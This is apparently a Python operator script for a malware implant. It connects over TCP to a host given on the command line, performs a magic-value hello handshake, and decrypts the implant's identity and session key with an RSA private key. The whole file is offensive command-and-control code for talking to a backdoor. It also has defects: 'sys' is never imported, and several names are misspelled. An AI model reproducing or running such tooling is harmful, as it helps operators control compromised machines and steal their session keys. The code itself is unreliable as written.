import eternalhush as eh
import os

MAGIC_VAL1 = 0x6de239bd 
MAGIC_VAL2 = 0x0fd4fb82 

HELLO_REQUEST = {
    "val1": eh.LONG,
    "val2": eh.LONG,
    "inital_data": 248
}    
HELLO_RESPONSE = {
    "implant_info": 256,
    "next_iv": 16
}
IMPANT_INFO = {
    "implant_version": eh.LONG,
    "implant_id": eh.LONG,
    "session_key": 32,
    "implant_arch": eh.SHORT,
    "implant_platform": eh.SHORT,
}

def main(args):
    tcp_connection = eh.net.NewConnection(args[0], int(args[1]), eh.TCP_CONNECTION)
    if(tcp_connection < 0):
        eh.ui.Echo("Failed to open direct TCP connection to " + args[0] + ":" + args[1], eh.ECHO_ERROR)
        return
    eh.ui.Echo("Opened direct TCP connection to " + args[0] + ":" + args[1], eh.ECHO_GOOD)
    hello_request = eh.data.Struct(HELLO_REQUEST)
    
    eh.ui.Echo("STAGE 1 - Negotiation", eh.ECHO_GOOD)
    hello_request.val1 = MAGIC_VAL1
    hello_request.val2 = MAGIC_VAL2
    hello_request.inital_data = bytearray(os.urandom(248))

    eh.net.TcpSend(tcp_connection, hello_request.data())
    eh.ui.Echo("Sended Hello request", eh.ECHO_GOOD)

    hello_response = eh.data.Struct(HELLO_RESPONSE)
    resp = eh.net.TcpRecv(tcp_connection, len(hello_response))
    if(not resp):
        eh.ui.Echo("Invalid data received", eh.ECHO_ERROR)
        return
    eh.ui.Echo("Received Hello response", eh.ECHO_GOOD)
    hello_response.from_bytes(resp)
    
    eh.ui.Echo("Decrypting implant info with privatekey", eh.ECHO_GOOD)
    key = eh.crypto.ImportRsaKey(args[2], eh.PRIVATE_KEY)
    decrypted_implant_info = eh.crypto.DecryptRsaData(key, hello_response.implant_info)

    implant_info = eh.data.Struct(IMPANT_INFO)
    implant_info.from_bytes(decrypted_implant_info)

    eh.ui.Echo("Implant version: " + implant_info.implant_version.hex(), eh.ECHO_GOOD)
    eh.ui.Echo("Implant id: " + implant_info.implant_id.hex(), eh.ECHO_GOOD)
    eh.ui.Echo("Implant session key: " + implant_info.session_key.hex(), eh.ECHO_GOOD)
    eh.ui.Echo("Implant architecture: " + implant_info.implant_arch.hex(), eh.ECHO_GOOD)
    eh.ui.Echo("Implant platform: " + implant_info.implant_platform.hex(), eh.ECHO_GOOD)
    

    
if __name__=="__main__":
    main(sys.argv)